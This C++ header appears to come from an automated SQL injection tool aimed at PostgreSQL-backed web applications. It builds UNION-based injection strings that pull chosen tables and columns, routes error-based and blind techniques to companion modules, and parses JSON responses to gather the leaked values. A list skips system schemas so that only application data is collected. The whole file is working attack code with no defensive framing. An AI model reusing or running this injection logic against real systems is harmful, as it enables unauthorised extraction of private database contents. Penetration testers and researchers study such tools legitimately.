#ifndef SQLI_POSTGRESQL
#define SQLI_POSTGRESQL

#include "blind_based.hpp"
#include "error_based.hpp"

struct sqli_postgresql
{
        inline static const str_vector excluded = {
            "information_schema",
            "pg_catalog",
            "pg_toast",
        };

        static std::string payload(
            sptr_vector& config,
            uint8 method_type,
            uint8 value_type)
        {
                switch (method_type)
                {
                case UNION:
                        if (value_type == VALUES)
                                return "' UNION SELECT " +
                                       *config[UNION_BASED_OFFSET] +
                                       *config[UNION_BASED_COLUMN] + "::text " +
                                       "FROM " + *config[UNION_BASED_DATABASE] + "." +
                                       *config[UNION_BASED_TABLE] + "-- ";
                        return mysql_union_based::payload(config, value_type);
                case ERROR:
                        return postgresql_error_based::payload(config, value_type);
                case BLIND:
                        return postgresql_blind_based::payload(config, value_type);
                default:
                        return std::string();
                }
        };

        static str_vector parser(
            const std::string& response,
            sptr_vector& config,
            const uint8& method_type)
        {
                if (method_type == BLIND)
                        return mysql_blind_based::parser(response, config);
                str_vector values;
                Json::Value entries;
                std::string errors;
                Json::CharReaderBuilder builder;
                std::unique_ptr< Json::CharReader > reader(builder.newCharReader());
                if (!reader->parse(
                        response.c_str(),
                        response.c_str() + response.size(),
                        &entries, &errors))
                {
                        std::cerr << "[ ERROR ] Could not parse server response."
                                  << std::endl;
                        return str_vector();
                }
                if (method_type == ERROR)
                        return postgresql_error_based::parser(entries, config);

                for (const auto& member : entries.getMemberNames())
                {
                        if (!entries[member].isArray())
                                continue;
                        if (entries[member].empty())
                                return str_vector();

                        std::string entry_str;
                        for (const auto& entry : entries[member])
                        {
                                for (const auto& key : entry.getMemberNames())
                                {
                                        if (entry[key].isNull())
                                                continue;
                                        try
                                        {
                                                entry_str = entry[key].asString();
                                        }
                                        catch (const std::exception& _)
                                        {
                                                entry_str = "NOT_CONVERTIBLE";
                                        }
                                        values.push_back(entry_str);
                                        break;
                                }
                        }
                        break;
                }
                return values;
        };
};
#endif
